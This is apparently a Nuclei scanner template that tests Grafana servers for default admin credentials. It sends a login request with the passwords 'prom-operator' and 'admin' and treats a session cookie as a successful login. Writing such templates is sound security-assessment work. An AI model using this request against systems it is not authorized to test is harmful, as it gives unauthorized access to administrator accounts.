id: grafana-default-credential
info:
  author: pdteam
  name: Grafana Default Credentials Check
  severity: high
  tags: grafana,default-login
requests:
- attack: sniper
  matchers:
  - part: header
    type: word
    words:
    - grafana_session
  - part: body
    type: word
    words:
    - Logged in
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    grafana_password:
    - prom-operator
    - admin
  raw:
  - "POST /login HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh;\
    \ Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: application/json,\
    \ text/plain, */*\nAccept-Language: en-US,en;q=0.5\nReferer: {{BaseURL}}\ncontent-type:\
    \ application/json\nConnection: close\n\n{\"user\":\"admin\",\"password\":\"\xA7\
    grafana_password\xA7\"}\n"
